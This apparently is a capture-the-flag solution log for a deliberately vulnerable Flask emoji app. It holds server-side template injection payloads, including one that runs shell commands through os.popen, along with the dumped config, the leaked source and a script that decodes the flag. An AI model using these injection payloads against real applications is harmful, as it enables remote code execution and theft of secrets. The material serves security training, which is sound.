```
{{config}}

You entered an unknown emoji: <Config {'ENV': 'production', 'DEBUG': True, 'TESTING': True, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': Undefined, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': True, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': False, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': True, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'flag': 'HKQ\x1f\x7f~e|\x06{r9<\x03/3z\x12#Rr )G#*\x14,#dp=Z@AP\x0c*', 'CLD_CONTINUED': 6, 'CLD_DUMPED': 3, 'CLD_EXITED': 1, 'CLD_TRAPPED': 4, 'EX_CANTCREAT': 73, 'EX_CONFIG': 78, 'EX_DATAERR': 65, 'EX_IOERR': 74, 'EX_NOHOST': 68, 'EX_NOINPUT': 66, 'EX_NOPERM': 77, 'EX_NOUSER': 67, 'EX_OK': 0, 'EX_OSERR': 71, 'EX_OSFILE': 72, 'EX_PROTOCOL': 76, 'EX_SOFTWARE': 70, 'EX_TEMPFAIL': 75, 'EX_UNAVAILABLE': 69, 'EX_USAGE': 64, 'F_LOCK': 1, 'F_OK': 0, 'F_TEST': 3, 'F_TLOCK': 2, 'F_ULOCK': 0, 'GRND_NONBLOCK': 1, 'GRND_RANDOM': 2, 'NGROUPS_MAX': 32, 'O_ACCMODE': 2097155, 'O_APPEND': 1024, 'O_ASYNC': 8192, 'O_CLOEXEC': 524288, 'O_CREAT': 64, 'O_DIRECT': 16384, 'O_DIRECTORY': 65536, 'O_DSYNC': 4096, 'O_EXCL': 128, 'O_EXEC': 2097152, 'O_LARGEFILE': 0, 'O_NDELAY': 2048, 'O_NOATIME': 262144, 'O_NOCTTY': 256, 'O_NOFOLLOW': 131072, 'O_NONBLOCK': 2048, 'O_PATH': 2097152, 'O_RDONLY': 0, 'O_RDWR': 2, 'O_RSYNC': 1052672, 'O_SEARCH': 2097152, 'O_SYNC': 1052672, 'O_TMPFILE': 4259840, 'O_TRUNC': 512, 'O_TTY_INIT': 0, 'O_WRONLY': 1, 'POSIX_FADV_DONTNEED': 4, 'POSIX_FADV_NOREUSE': 5, 'POSIX_FADV_NORMAL': 0, 'POSIX_FADV_RANDOM': 1, 'POSIX_FADV_SEQUENTIAL': 2, 'POSIX_FADV_WILLNEED': 3, 'PRIO_PGRP': 1, 'PRIO_PROCESS': 0, 'PRIO_USER': 2, 'P_ALL': 0, 'P_NOWAIT': 1, 'P_NOWAITO': 1, 'P_PGID': 2, 'P_PID': 1, 'P_WAIT': 0, 'RTLD_GLOBAL': 256, 'RTLD_LAZY': 1, 'RTLD_LOCAL': 0, 'RTLD_NODELETE': 4096, 'RTLD_NOLOAD': 4, 'RTLD_NOW': 2, 'R_OK': 4, 'SCHED_BATCH': 3, 'SCHED_FIFO': 1, 'SCHED_IDLE': 5, 'SCHED_OTHER': 0, 'SCHED_RESET_ON_FORK': 1073741824, 'SCHED_RR': 2, 'SEEK_CUR': 1, 'SEEK_END': 2, 'SEEK_SET': 0, 'ST_APPEND': 256, 'ST_MANDLOCK': 64, 'ST_NOATIME': 1024, 'ST_NODEV': 4, 'ST_NODIRATIME': 2048, 'ST_NOEXEC': 8, 'ST_NOSUID': 2, 'ST_RDONLY': 1, 'ST_RELATIME': 4096, 'ST_SYNCHRONOUS': 16, 'ST_WRITE': 128, 'TMP_MAX': 10000, 'WCONTINUED': 8, 'WCOREDUMP': <built-in function WCOREDUMP>, 'WEXITED': 4, 'WEXITSTATUS': <built-in function WEXITSTATUS>, 'WIFCONTINUED': <built-in function WIFCONTINUED>, 'WIFEXITED': <built-in function WIFEXITED>, 'WIFSIGNALED': <built-in function WIFSIGNALED>, 'WIFSTOPPED': <built-in function WIFSTOPPED>, 'WNOHANG': 1, 'WNOWAIT': 16777216, 'WSTOPPED': 2, 'WSTOPSIG': <built-in function WSTOPSIG>, 'WTERMSIG': <built-in function WTERMSIG>, 'WUNTRACED': 2, 'W_OK': 2, 'X_OK': 1}>

{{config.__class__.__init__.__globals__['os'].popen('cat app.py').read()}}

You entered an unknown emoji: import random from flask import Flask, render_template_string, render_template, request import os import emojis app = Flask(__name__) app.config['SECRET_KEY'] = 'Leer alles over Software Security bij Arjen (follow @credmp) at https://www.novi.nl' def magic(flag, key): return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag))) file = open("/tmp/flag.txt", "r") flag = file.read() app.config['flag'] = magic(flag, '112f3a99b283a4e1788dedd8e0e5d35375c33747') flag = "" os.remove("/tmp/flag.txt") @app.route('/', methods=['GET', 'POST']) def index(): if request.method == 'POST': emoji="unknown" try: p = request.values.get('emoji') if p != None: emoji = emojis.db.get_emoji_by_alias(p) except Exception as e: print(e) pass try: if emoji == None: return render_template_string("You entered an unknown emoji: %s" % p) else: return render_template_string("You entered %s which is %s. It's aliases %s" % (p, emoji.emoji, emoji.aliases)) except Exception as e: print(e) return 'Exception' return render_template('index.html') if __name__ == '__main__': app.run(host='0.0.0.0', port=8000)


def magic(flag, key): 
	return ''.join(chr(x ^ ord(flag[x]) ^ ord(key[::-1][x]) ^ ord(key[x])) for x in range(len(flag)))

print(magic( 'HKQ\x1f\x7f~e|\x06{r9<\x03/3z\x12#Rr )G#*\x14,#dp=Z@AP\x0c*','112f3a99b283a4e1788dedd8e0e5d35375c33747'))

NOVI{you_used_the_m@gic_of_christmas}

```
